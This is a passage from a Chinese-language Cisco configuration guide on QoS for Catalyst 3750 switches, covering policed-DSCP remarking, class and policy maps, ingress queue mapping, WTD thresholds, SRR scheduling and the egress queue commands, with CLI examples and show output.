256Kbps。监察器将丢弃过量的数据包。</p></li><li><p><strong>Class-C：</strong> 对于与 Class B匹配的数据流，将执行两项 PHB操作。一项操作是标记，另一项操作是策略。与C类匹配的传入数据包标有DSCP值CS2,CoS值从DSCP-CoS表（即2）中派生。然后，C类流量的速率将被管制为25Mbps。监察器将丢弃过量的数据包。</p></li></ul><h4 id="分类标记和策略超标操作---policed-dscp-transmit">分类、标记和策略（超标操作- policed-dscp-transmit）</h4><p>本部分介绍标记并传输过量数据流的策略配置。下图显示了具有两个类映射的策略映射sample-policy3：</p><p><a href="https://www.cisco.com/c/dam/en/us/support/docs/switches/catalyst-3750-series-switches/91862-cat3750-qos-config6.gif" title="cat3750-qos-config6.gif"><img src="https://googles.plus/images/loading.gif" data-original="https://www.cisco.com/c/dam/en/us/support/docs/switches/catalyst-3750-series-switches/91862-cat3750-qos-config6.gif" alt="cat3750-qos-config6.gif"></a></p><p>交换机根据 policed-DSCP映射表值对超出配置的管制速率的数据流进行标记。只有在策略配置中配置policed-DSCP 映射后，才能使用该映射。下面列出了默认的 policed-DSCP映射表：</p><pre class="line-numbers language-none"><code class="language-none">Distribution1(config)#do show mls qos map policed-dscp   Policed-dscp map:     d1 :  d2 0  1  2  3  4  5  6  7  8  9     ---------------------------------------      0 :    00 01 02 03 04 05 06 07 08 09      1 :    10 11 12 13 14 15 16 17 18 19      2 :    20 21 22 23 24 25 26 27 28 29      3 :    30 31 32 33 34 35 36 37 38 39      4 :    40 41 42 43 44 45 46 47 48 49      5 :    50 51 52 53 54 55 56 57 58 59      6 :    60 61 62 63<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>从此表中可以发现，将会匹配到相同的 DSCP 值。例如，DSCP 34映射到DSCP34。在不更改DSCP值的情况下，传输符合监察器速率的流量。对于超出监察器速率的数据流，可以使用不同的DSCP 值进行传输。例如，可以使用丢弃可能性更高的 DSCP 值进行标记。</p><p>如果使用默认的 policed-DSCP值，则使用策略不会起到任何作用。例如，已在配置中将数据流的速率管制为 10Mbps。传入数据包的DSCP值为CS4。如果保留默认DSCP值，则符合10Mbps的流量将以CS2的DSCP值传输。此外，超过10Mbps的流量将以CS2的DSCP值传输。这是因为policed-DSCP映射的默认值映射相同的值。因此，建议正确地配置policed-DSCP 映射表以区分 DSCP 值。</p><p>本示例的要求如下：</p><ul><li><p>配置 policed-DSCP 映射表，设置下列映射：</p><ul><li><p>EF 到 AF31</p></li><li><p>CS3 到 AF13</p></li><li><p>CS2 到 AF11</p></li></ul></li><li><p>信任 IP Communicator 数据包的 DSCP 值并将其速率管制为256Kbps。如果数据流超出 256Kbps，则使用 policed-DSCP 映射表重新标记 DSCP值。</p></li><li><p>标记 filnet 应用程序并进行管制。如果数据流超出 25Mbps，则使用policed-DSCP 映射表重新标记 DSCP 值。</p></li></ul><p>以下配置体现了图中提及的策略映射：</p><pre class="line-numbers language-none"><code class="language-none">!--- Policed DSCP table ConfigurationDistribution1(config)#mls qos map policed-dscp 46 to 26Distribution1(config)#mls qos map policed-dscp 24 to 14Distribution1(config)#mls qos map policed-dscp 16 to 10!--- Create Access-list and Class map Class-ADistribution1(config)#ip access-list extended IP-CommunicatorDistribution1(config-ext-nacl)#remark *** Voice Payload ***Distribution1(config-ext-nacl)#permit udp any any range 16384 32767Distribution1(config-ext-nacl)#remark *** Voice Signalling ***Distribution1(config-ext-nacl)#permit tcp any any range 2000 2002Distribution1(config-ext-nacl)#exitDistribution1(config)#class-map Class-ADistribution1(config-cmap)#match access-group name IP-CommunicatorDistribution1(config-cmap)#exit!--- Create Access-list and Class map Class-CDistribution1(config)#ip access-list extended applicationDistribution1(config-ext-nacl)#remark *** Application for example ***Distribution1(config-ext-nacl)#permit tcp any any eq 32768Distribution1(config-ext-nacl)#permit udp any any eq 32768Distribution1(config-ext-nacl)#permit tcp any any eq 32769Distribution1(config-ext-nacl)#permit udp any any eq 32769Distribution1(config-ext-nacl)#exitDistribution1(config)#class-map Class-BDistribution1(config-cmap)#match access-group name applicationDistribution1(config-cmap)#exit!--- Create Policy mapDistribution1(config-cmap)#policy-map sample-policy3Distribution1(config-pmap-c)#class Class-ADistribution1(config-pmap-c)#trust dscpDistribution1(config-pmap-c)#police 256000 8000 exceed-action policed-dscp-transmitDistribution1(config-pmap-c)#class Class-BDistribution1(config-pmap-c)#set dscp CS2Distribution1(config-pmap-c)#police 25000000 8000 exceed-action policed-dscp-transmitDistribution1(config-pmap-c)#exitDistribution1(config-pmap)#exit!--- Apply Policy map to the interfaceDistribution1(config)#interface GigabitEthernet1/0/21Distribution1(config-if)#service-policy input sample-policy3<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>下面将解释策略映射中的配置：</p><ul><li><p><strong>Policed-DSCP：</strong> 在 policed-DSCP映射表中，有三个值发生更改。</p><ul><li><p>EF 到 AF31</p></li><li><p>CS3 到 AF13</p></li><li><p>CS2 到 AF11</p></li></ul><p>前两个值是根据在 Class-A 和 Class-B类映射中分类的数据流类型进行修改的。</p></li><li><p><strong>Class-A：</strong>对于来自软电话的语音有效负载和语音控制，在 Class-A类映射中进行分类。语音负载流量的DSCP值为EF，语音控制的DSCP值为CS3。根据策略映射配置，这些DSCP值是可信的。数据流的速率管制为256 Kbps 速率。对于遵从此速率的数据流，将使用传入的 DSCP值进行发送。对于超出此速率的数据流，将由 policed DSCP表重新标记并传输。policed DSCP 表将根据配置的值，将 EF 重新标记为AF31，将 CS3 重新标记为 AF13。然后，将从 DSCP-CoS 表获得对应的 CoS值。</p></li><li><p><strong>Class-B：</strong>与B类匹配的传入数据包标有CS2的DSCP值。B类流量的速率为25Mbps。符合此速率的流量将以DSCP值2发送，CoS值从DSCP-CoS表（即2）派生。超过此速率的流量将由管制的DSCP表重新标记并传输。policedDSCP 表将根据配置的值，将 EF 重新标记为 AF31，将 CS3 重新标记为AF13。然后，将从 DSCP-CoS 表获得对应的 CoS 值。</p></li></ul><h3 id="拥塞管理和避免">拥塞管理和避免</h3><p>拥塞管理和避免过程包含三个步骤。这些步骤分别为排队、丢弃和调度。排队根据QoS 标签将数据包放置到不同的软件队列。Cisco Catalyst 3750交换机有两个入口队列。在使用 QoS 标签对数据流进行分类和标记后，可以根据QoS 标签将数据流分配到两个不同的队列。</p><p>加权尾部丢弃(WTD)用于管理队列长度并为不同的流量分类提供丢弃优先级。</p><p>入口队列和出口队列均由 SRR 提供服务，SRR控制数据包的发送速率。在入口队列中，SRR 将数据包发送到堆栈环。SRR可以在称为“整形”和“共享”的两种模式下操作。对于入口队列，默认模式为“共享”，并且这是支持的唯一模式。在共享模式下，队列根据所配置的权重共享它们的带宽。可以保证得到这一级别的带宽，但不限于这一级别的带宽。</p><p>本部分将介绍三种类型的配置。</p><ul><li><p><a href="https://www.cisco.com/c/zh_cn/support/docs/switches/catalyst-3750-series-switches/91862-cat3750-qos-config.html#concept241">默认的排队、丢弃和调度配置</a></p></li><li><p><a href="https://www.cisco.com/c/zh_cn/support/docs/switches/catalyst-3750-series-switches/91862-cat3750-qos-config.html#concept242">排队和调度</a></p></li><li><p><a href="https://www.cisco.com/c/zh_cn/support/docs/switches/catalyst-3750-series-switches/91862-cat3750-qos-config.html#concept243">排队、丢弃和调度</a></p></li></ul><p>可用于这些配置的命令如下：</p><pre class="line-numbers language-none"><code class="language-none">Distribution1(config)#mls qos srr-queue input ?!--- Queueing  buffers         Configure buffer allocation  cos-map         Configure cos-map for a queue id  dscp-map        Configure dscp-map for a queue id!--- Scheduling  bandwidth       Configure SRR bandwidth  priority-queue  Configure priority scheduling!--- Dropping  threshold       Configure queue tail-drop thresholds<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="默认的排队丢弃和调度配置">默认的排队、丢弃和调度配置</h4><p>此输出显示队列映射的默认 QoS标签。每个队列可以支持三种阈值级别。默认情况下，每个队列仅具有一种阈值，即100%。</p><p><a href="https://www.cisco.com/c/dam/en/us/support/docs/switches/catalyst-3750-series-switches/91862-cat3750-qos-config7.gif" title="cat3750-qos-config7.gif"><img src="https://googles.plus/images/loading.gif" data-original="https://www.cisco.com/c/dam/en/us/support/docs/switches/catalyst-3750-series-switches/91862-cat3750-qos-config7.gif" alt="cat3750-qos-config7.gif"></a></p><ul><li><p><strong>默认队列映射配置：</strong></p><p>具有CoS 5（DSCP40到47）的数据包被放入队列2。剩余的数据包被放入队列1。</p></li></ul><pre class="line-numbers language-none"><code class="language-none">Distribution1#show mls qos maps cos-input-q   Cos-inputq-threshold map:              cos:  0   1   2   3   4   5   6   7              ------------------------------------  queue-threshold: 1-1 1-1 1-1 1-1 1-1 2-1 1-1 1-1Distribution1#show mls qos maps dscp-input-q   Dscp-inputq-threshold map:     d1 :d2  0    1    2    3    4    5    6    7    8    9     ------------------------------------------------------------      0 :  01-01 01-01 01-01 01-01 01-01 01-01 01-01 01-01 01-01 01-01      1 :  01-01 01-01 01-01 01-01 01-01 01-01 01-01 01-01 01-01 01-01      2 :  01-01 01-01 01-01 01-01 01-01 01-01 01-01 01-01 01-01 01-01      3 :  01-01 01-01 01-01 01-01 01-01 01-01 01-01 01-01 01-01 01-01      4 :  02-01 02-01 02-01 02-01 02-01 02-01 02-01 02-01 01-01 01-01      5 :  01-01 01-01 01-01 01-01 01-01 01-01 01-01 01-01 01-01 01-01      6 :  01-01 01-01 01-01 01-01<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre><code>下表显示了输入队列映射的默认 CoS/DSCP：| CoS | DSCP | 入口队列 || --- | --- | --- || 0   | 0 到 7 | 1   || 1   | 8 到 15 | 1   || 2   | 16 到 23 | 1   || 3   | 24 到 31 | 1   || 4   | 32 到 39 | 1   || 5   | 40 到 47 | 2   || 6   | 48 到 55 | 1   || 7   | 56 到 63 | 1   |</code></pre><ul><li><p><strong>默认队列配置：</strong></p><p>入口队列缓冲区由 queue 1 共享 90%，而 queue 2 共享 10%。阈值级别 1、2和 3 为 100%。</p></li></ul><p></p><pre class="line-numbers language-none"><code class="language-none">Distribution1#show mls qos input-queueQueue     :       1       2----------------------------------------------buffers   :      90      10bandwidth :       4       4priority  :       0      10threshold1:     100     100threshold2:     100     100<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p></p><ul><li><strong>默认调度程序配置：</strong></li></ul><p>Queue 2 为优先队列。SRR 根据所配置的权重（本例为10%）为优先队列提供服务。然后，SRR 与两个入口队列共享剩余带宽(90%)，并根据所配置的权重为它们提供服务。在本例中，queue 1 和 queue 2均以 45% 的比率接受服务。</p><pre class="line-numbers language-none"><code class="language-none">Distribution1#show mls qos input-queueQueue     :       1       2----------------------------------------------buffers   :      90      10bandwidth :       4       4priority  :       0      10threshold1:     100     100threshold2:     100     100<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="排队和调度">排队和调度</h4><p>配置排队和调度分为三个步骤。这些步骤包括：</p><ol type="1"><li><p><strong>队列映射配置：</strong></p><p>队列映射配置根据 DSCP 或 CoS 值将数据包映射到两个入口队列。</p></li><li><p><strong>队列配置：</strong></p><p>队列配置定义在两个队列之间划分入口缓冲区的比率（分配空间）。</p></li><li><p><strong>调度程序配置：</strong></p></li></ol><p>SRR 配置用于控制将数据包从队列移至堆栈环的出列频率的加权比。</p><p>队列和调度程序配置控制在丢弃数据包前可缓冲的数据量。</p><p><a href="https://www.cisco.com/c/dam/en/us/support/docs/switches/catalyst-3750-series-switches/91862-cat3750-qos-config8.gif" title="cat3750-qos-config8.gif"><img src="https://googles.plus/images/loading.gif" data-original="https://www.cisco.com/c/dam/en/us/support/docs/switches/catalyst-3750-series-switches/91862-cat3750-qos-config8.gif" alt="cat3750-qos-config8.gif"></a></p><p>在本部分中，未配置 WTD 丢弃级别。这意味着，如果队列已满(100%)，则将丢弃数据包。</p><ul><li><p><strong>队列映射配置：</strong></p><p>首先，CoS 值将映射到队列。在本部分中，未配置阈值。</p></li></ul><pre class="line-numbers language-none"><code class="language-none">!--- Assign the frames into the queue based on the CoS value.Distribution1(config)#mls qos srr-queue input cos-map queue 1 0 1 Distribution1(config)#mls qos srr-queue input cos-map queue 2 2 3 4 5 6 7!--- Show output.Distribution1#show mls qos maps cos-input-q   Cos-inputq-threshold map:              cos:  0   1   2   3   4   5   6   7              ------------------------------------  queue-threshold: 1-1 1-1 2-1 2-1 2-1 2-1 2-1 2-1Distribution1#show mls qos maps dscp-input-q   Dscp-inputq-threshold map:     d1 :d2   0    1    2    3    4    5    6    7    8    9     ------------------------------------------------------------     0 :  01-01 01-01 01-01 01-01 01-01 01-01 01-01 01-01 01-01 01-01     1 :  01-01 01-01 01-01 01-01 01-01 01-01 01-01 01-01 01-01 01-01     2 :  01-01 01-01 01-01 01-01 01-01 01-01 01-01 01-01 01-01 01-01     3 :  01-01 01-01 01-01 01-01 01-01 01-01 01-01 01-01 01-01 01-01     4 :  02-01 02-01 02-01 02-01 02-01 02-01 02-01 02-01 01-01 01-01     5 :  01-01 01-01 01-01 01-01 01-01 01-01 01-01 01-01 01-01 01-01     6 :  01-01 01-01 01-01 01-01<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre><code>您可以看到，在 Cos-inputq-threshold 和 Dscp-inputq-threshold 映射中存在冲突。例如，在 Cos-inputq-threshold 表中，CoS 3 映射到 queue 2。然而，在 Dscp-inputq-threshold 映射中，DSCP 值 24（对应于 CoS 3）映射到 queue 1。实际上，Dscp-inputq-threshold 映射将覆盖 Cos-inputq-threshold 映射。这些映射应尽可能保持一致，以确保行为的可预测性以及简化故障排除过程。因此，将 Dscp-inputq-threshold 映射配置为与 Cos-inputq-threshold 映射同步。</code></pre><pre class="line-numbers language-none"><code class="language-none">!--- Assign the frames into the queue based on the DSCP value.Distribution1(config)#mls qos srr-queue input dscp-map queue 2  16 17 18 19 20 21 22 23Distribution1(config)#mls qos srr-queue input dscp-map queue 2  24 25 26 27 28 29 30 31Distribution1(config)#mls qos srr-queue input dscp-map queue 2  32 33 34 35 36 37 38 39Distribution1(config)#mls qos srr-queue input dscp-map queue 2  48 49 50 51 52 53 54 55Distribution1(config)#mls qos srr-queue input dscp-map queue 2  56 57 58 59 60 61 62 63Distribution1#show mls qos maps dscp-input-q   Dscp-inputq-threshold map:     d1 :d2  0   1   2    3    4    5    6    7    8    9     ------------------------------------------------------------     0 :  01-01 01-01 01-01 01-01 01-01 01-01 01-01 01-01 01-01 01-01     1 :  01-01 01-01 01-01 01-01 01-01 01-01 02-01 02-01 02-01 02-01     2 :  02-01 02-01 02-01 02-01 02-01 02-01 02-01 02-01 02-01 02-01     3 :  02-01 02-01 02-01 02-01 02-01 02-01 02-01 02-01 02-01 02-01     4 :  02-01 02-01 02-01 02-01 02-01 02-01 02-01 02-01 02-01 02-01     5 :  02-01 02-01 02-01 02-01 02-01 02-01 02-01 02-01 02-01 02-01     6 :  02-01 02-01 02-01 02-01<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li><p><strong>队列配置：</strong></p><p>启用 QoS 后，IOS将缓冲区中的默认空间分配给队列入口数据包。两个入口队列（queue 1 和 queue2）共享此缓冲区空间。在 Catalyst 3750交换机中，可以配置每个队列可使用的此缓冲区空间的百分比。入口队列总可用内存的67% 分配给 queue 1，33% 分配给 queue 2。</p></li></ul><pre class="line-numbers language-none"><code class="language-none">    Distribution1(config)#mls qos srr-queue input buffers 67 33Distribution1(config)#do show mls qos inputQueue     :       1       2----------------------------------------------buffers   :      67      33bandwidth :       4       4priority  :       0      10threshold1:     100     100threshold2:     100     100<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li><p><strong>调度程序配置：</strong></p><p>使用 <strong>mls qos srr-queue input bandwidth命令执行此配置。</strong>在这里，此带宽表明队列上 SRR服务的位数。</p></li></ul><pre class="line-numbers language-none"><code class="language-none">Distribution1(config)#mls qos srr-queue input bandwidth 90 10Distribution1(config)#mls qos srr-queue input priority-queue 2 bandwidth 20Distribution1(config)#do show mls qos inputQueue     :       1       2----------------------------------------------buffers   :      67      33bandwidth :      90      10priority  :       0      20threshold1:     100     100threshold2:     100     100<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre><code>默认情况下，queue 2 为优先队列，并且总内环带宽的 10% 分配给优先队列。也可以将 queue 1 配置为优先队列。但不能将两个队列同时配置为优先队列。如果环带宽达到 10Gbps，则 SRR 将 10Gbps 的 20% 提供给 queue 2，即 2 Gbps。剩余的 8 Gbps 环带宽由 queue 1 和 queue 2 共享。根据配置，queue 1 使用 8Gbps 的 90%，而 queue 2 再使用 8 Gbps 的 10%。此 8 Gbps 带宽由 SRR 以共享模式提供。这意味着可以确保所配置的带宽百分比，但不限于此百分比。**注意：**可以使用mls qos srr-queue input priority-queue 2 bandwidth 0命**令禁用优先级队列**。</code></pre><pre class="line-numbers language-none"><code class="language-none">Distribution1(config)#do show mls qos inputQueue     :       1       2----------------------------------------------buffers   :      90      10bandwidth :      90      10priority  :       0       0threshold1:     100     100threshold2:     100     100Distribution1(config)#<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="排队丢弃和调度">排队、丢弃和调度</h4><p>在本部分中，除了配置队列缓冲区大小之外，还将配置 WTD阈值级别。可以将流经交换机的各个数据包分配给队列以及阈值。</p><p><a href="https://www.cisco.com/c/dam/en/us/support/docs/switches/catalyst-3750-series-switches/91862-cat3750-qos-config9.gif" title="cat3750-qos-config9.gif"><img src="https://googles.plus/images/loading.gif" data-original="https://www.cisco.com/c/dam/en/us/support/docs/switches/catalyst-3750-series-switches/91862-cat3750-qos-config9.gif" alt="cat3750-qos-config9.gif"></a></p><p>以下是配置示例和说明：</p><ul><li><p><strong>队列映射配置：</strong></p><p>首先，CoS 值将映射到队列。</p></li></ul><p></p><pre class="line-numbers language-none"><code class="language-none">!--- Assign the frames into the queue based on the CoS value.Distribution1(config)#mls qos srr-queue input cos-map queue 1 threshold 2  1Distribution1(config)#mls qos srr-queue input cos-map queue 1 threshold 3  0Distribution1(config)#mls qos srr-queue input cos-map queue 2 threshold 1  2Distribution1(config)#mls qos srr-queue input cos-map queue 2 threshold 2  4 6 7Distribution1(config)#mls qos srr-queue input cos-map queue 2 threshold 3  3 5!--- Show output.Distribution1(config)#do show mls qos maps cos-input-q   Cos-inputq-threshold map:              cos:  0   1   2   3   4   5   6   7              ------------------------------------  queue-threshold: 1-3 1-2 2-1 2-3 2-2 2-3 2-2 2-2Distribution1(config)#do show mls qos maps dscp-input-q   Dscp-inputq-threshold map:     d1 :d2  0    1    2    3    4    5    6    7    8    9     ------------------------------------------------------------     0 :  01-01 01-01 01-01 01-01 01-01 01-01 01-01 01-01 01-01 01-01     1 :  01-01 01-01 01-01 01-01 01-01 01-01 01-01 01-01 01-01 01-01     2 :  01-01 01-01 01-01 01-01 01-01 01-01 01-01 01-01 01-01 01-01     3 :  01-01 01-01 01-01 01-01 01-01 01-01 01-01 01-01 01-01 01-01     4 :  02-01 02-01 02-01 02-01 02-01 02-01 02-01 02-01 01-01 01-01     5 :  01-01 01-01 01-01 01-01 01-01 01-01 01-01 01-01 01-01 01-01     6 :  01-01 01-01 01-01 01-01<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p></p><pre><code>您可以看到，在 Cos-inputq-threshold 和 Dscp-inputq-threshold 映射中存在冲突。例如，在 Cos-inputq-threshold 表中，CoS 3 映射到 queue 2，但在 Dscp-inputq-threshold 映射中，DSCP 值 24（对应于 CoS 3）映射到 queue 1。实际上，Dscp-inputq-threshold 映射将覆盖 Cos-inputq-threshold 映射。这些映射应尽可能保持一致，以确保行为的可预测性以及简化故障排除过程。因此，将 Dscp-inputq-threshold 映射配置为与 Cos-inputq-threshold 映射同步。</code></pre><pre class="line-numbers language-none"><code class="language-none">!--- Assign the frames into the queue based on the DSCP value.Distribution1(config)#mls qos srr-queue input dscp-map queue 1 threshold 2 9 10 11 12 13 14 15Distribution1(config)#mls qos srr-queue input dscp-map queue 1  threshold 3 0 1 2 3 4 5 6 7Distribution1(config)#mls qos srr-queue input dscp-map queue 1  threshold 3 32Distribution1(config)#mls qos srr-queue input dscp-map queue 2  threshold 1 16 17 18 19 20 21 22 23Distribution1(config)#mls qos srr-queue input dscp-map queue 2  threshold 2 33 34 35 36 37 38 39 48Distribution1(config)#mls qos srr-queue input dscp-map queue 2  threshold 2 49 50 51 52 53 54 55 56Distribution1(config)#mls qos srr-queue input dscp-map queue 2  threshold 2 57 58 59 60 61 62 63Distribution1(config)#mls qos srr-queue input dscp-map queue 2  threshold 3 24 25 26 27 28 29 30 31Distribution1(config)#do show mls qos maps dscp-input-q   Dscp-inputq-threshold map:     d1 :d2  0    1    2    3    4    5    6    7    8    9     ------------------------------------------------------------     0 :  01-03 01-03 01-03 01-03 01-03 01-03 01-03 01-03 01-01 01-02     1 :  01-02 01-02 01-02 01-02 01-02 01-02 02-01 02-01 02-01 02-01     2 :  02-01 02-01 02-01 02-01 02-03 02-03 02-03 02-03 02-03 02-03     3 :  02-03 02-03 01-03 02-02 02-02 02-02 02-02 02-02 02-02 02-02     4 :  02-03 02-03 02-03 02-03 02-03 02-03 02-03 02-03 02-02 02-02     5 :  02-02 02-02 02-02 02-02 02-02 02-02 02-02 02-02 02-02 02-02     6 :  02-02 02-02 02-02 02-02<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li><p><strong>队列配置：</strong></p><p>默认情况下，阈值 3 为 100%，且不可更改。</p></li></ul><pre class="line-numbers language-none"><code class="language-none">Distribution1(config)#mls qos srr-queue input buffers 67 33Distribution1(config)#mls qos srr-queue input threshold 1 8 16Distribution1(config)#mls qos srr-queue input threshold 2 34 66Distribution1(config)#do show mls qos inputQueue     :       1       2----------------------------------------------buffers   :      67      33bandwidth :       4       4priority  :       0      10threshold1:       8      34threshold2:      16      66<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li><p><strong>调度程序配置：</strong></p><p>启用 QoS 后，IOS将为入站端口分配缓冲区中的默认空间。两个队列共享此缓冲区空间。在Catalyst 3560/3750交换机中，可以配置每个队列可使用的此缓冲区空间的百分比。</p></li></ul><pre class="line-numbers language-none"><code class="language-none">Distribution1(config)#**mls qos srr-queue input bandwidth 90 10**Distribution1(config)#**mls qos srr-queue input priority-queue 2 bandwidth 20**Distribution1(config)#**do show mls qos input**Queue     :       1       2\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-buffers   :      67      33bandwidth :      90      10priority  :       0      20threshold1:       8      34threshold2:      16      66<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre><code>默认情况下，queue 2 为优先队列，并且总内环带宽的 10% 分配给优先队列。也可以将 queue 1 配置为优先队列。但不能将两个队列同时配置为优先队列。如果环带宽达到 10Gbps，则 SRR 将 10Gbps 的 20% 提供给 queue 2，即 2 Gbps。剩余的 8 Gbps 环带宽由 queue 1 和 queue 2 共享。根据配置，queue 1 使用 8Gbps 的 90%，而 queue 2 再使用 8 Gbps 的 10%。此 8 Gbps 带宽由 SRR 以共享模式提供。这意味着可以确保所配置的带宽百分比，但不限于此百分比。**注意：** 可以使用mls qos srr-queue input priority-queue 2 bandwidth 0命令 *禁用优先级队列** 。</code></pre><pre class="line-numbers language-none"><code class="language-none">Distribution1(config)#do show mls qos inputQueue     :       1       2----------------------------------------------buffers   :      90      10bandwidth :      90      10priority  :       0       0threshold1:     100     100threshold2:     100     100Distribution1(config)#<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="出口-qos-功能">出口 QoS 功能</h2><p>Cisco Catalyst 3750 交换机支持“拥塞管理和避免”出口 QoS功能。拥塞管理和避免过程包含三个步骤。这些步骤分别为排队、丢弃和调度。</p><p>排队根据 QoS 标签将数据包放置到不同的软件队列。Cisco Catalyst 3750交换机有 4 个出口队列，每个队列有 3 个阈值。在使用 QoS标签对数据流进行分类和标记后，可以根据 QoS标签将数据流分配到四个不同的队列。</p><p>可以为每个队列配置缓冲区大小、后备阈值、阈值级别和最大阈值。加权尾部丢弃(WTD)用于管理队列长度并为不同的流量分类提供丢弃优先级。入口队列参数全局配置。不能按端口逐个配置入口队列参数。但出口队列参数按端口逐个进行配置。即便如此，配置也是按端口进行的。不能为每个端口配置不同的设置。可以采用两种不同的方式配置每个端口。这称为队列集。可以在全局配置中最多配置两个不同的队列集。然后，可以在接口上应用这两个队列集之一。</p><p>入口队列和出口队列均由 SRR 提供服务，SRR控制数据包的发送速率。在入口队列中，SRR 将数据包发送到堆栈环。SRR可以在称为“整形”和“共享”的两种模式下操作。对于入口队列，默认模式为“共享”，并且这是支持的唯一模式。在共享模式下，队列根据所配置的权重共享它们的带宽。可以保证得到这一级别的带宽，但不限于这一级别的带宽。在整形模式下，会保证出口队列的带宽百分比，并限制为该比率。整形的数据流不能使用比分配的带宽更多的带宽，即使链路处于空闲状态也是如此。随着时间的推移，整形可以提供更平稳的数据流，并减少突发数据流的高峰和低谷。可以将Queue 1 配置为优先队列。</p><h3 id="出口-qos-命令">出口 QoS 命令</h3><p>本部分对所有可用的出口 QoS 命令进行分类。</p><ul><li><p><strong>队列映射配置：</strong></p><p>要将 CoS 值映射到出口队列，请使用以下命令：</p><blockquote><p>Rack1SW1(config)#<strong>mls qos srr-queue output cos-map queue?</strong> &lt;1-4&gt; enter cos-map output queue id</p><p>Rack1SW1(config)#<strong>mls qos srr-queue output cos-map queue 1threshold ?</strong> &lt;1-3&gt; enter cos-map threshold id</p><p>Rack1SW1(config)#<strong>mls qos srr-queue output cos-map queue 1threshold 1 ?</strong> &lt;0-7&gt; 8 cos values separated by spaces</p></blockquote><p>要将 DSCP 值映射到出口队列，请使用以下命令：</p><blockquote><p>Rack1SW1(config)#<strong>mls qos srr-queue output dscp-map queue?</strong> &lt;1-4&gt; enter dscp-map output queue id</p><p>Rack1SW1(config)#<strong>mls qos srr-queue output dscp-map queue 1threshold ?</strong> &lt;1-3&gt; enter dscp-map threshold id</p><p>Rack1SW1(config)#<strong>mls qos srr-queue output dscp-map queue 1threshold 1 ?</strong> &lt;0-63&gt; dscp values separated by spaces (upto 8 values total)</p></blockquote></li><li><p><strong>队列配置：</strong></p><p>出口队列配置允许配置两个队列集。每个队列集都具有相关选项，用于为四个出口队列配置缓冲大小和阈值。然后，可以将任何一个队列集应用于任何一个端口。当在交换机上启用QoS 后，默认情况下，queue set 1 将分配给所有端口。</p><blockquote><p>Rack1SW1(config)#<strong>mls qos queue-set output ?</strong>&lt;1-2&gt; <strong>queue-set id</strong></p><p>Rack1SW1(config)#<strong>mls qos queue-set output 1 ?</strong>buffers <strong>assign buffers to each egress queue</strong> threshold<strong>Assign threshold values to a queue</strong></p></blockquote><p>要为所有四个出口队列配置缓冲大小，请使用以下命令：</p><blockquote><p>Rack1SW1(config)#<strong>mls qos queue-set output 1 buffers?</strong> &lt;0-99&gt; enter buffer percentage for <strong>queue1</strong> 0-99</p><p>Rack1SW1(config)#<strong>mls qos queue-set output 1 buffers 10?</strong> &lt;1-100&gt; enter buffer percentage for <strong>queue2</strong> 1-100 <strong>(includes CPU buffer)</strong></p><p>Rack1SW1(config)#<strong>mls qos queue-set output 1 buffers 10 20?</strong> &lt;0-99&gt; enter buffer percentage for <strong>queue3</strong> 0-99</p><p>Rack1SW1(config)#<strong>mls qos queue-set output 1 buffers 10 20 30?</strong> &lt;0-99&gt; enter buffer percentage for <strong>queue4</strong> 